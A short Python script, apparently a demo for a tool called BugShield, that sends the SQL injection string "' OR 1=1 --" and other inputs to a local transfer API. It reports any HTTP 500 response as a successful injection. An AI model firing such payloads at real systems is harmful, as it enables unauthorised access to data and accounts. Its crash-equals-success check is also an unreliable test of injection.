import requests
import time

def run_attack():
    target = "http://localhost:5000/api/transfer"
    payloads = ["user1", "user2", "' OR 1=1 --"]

    print("BugShield Attacker Started...")
    requests.post("http://localhost:5000/api/fuzz-start")

    for p in payloads:
        print(f"Testing input: {p}")
        try:
            res = requests.post(target, json={"account": p})
            if res.status_code == 500:
                print("CRASH DETECTED! SQL Injection successful.")
                break
        except:
            print("Connection error.")
        time.sleep(1.5)

if __name__ == "__main__":
    run_attack()
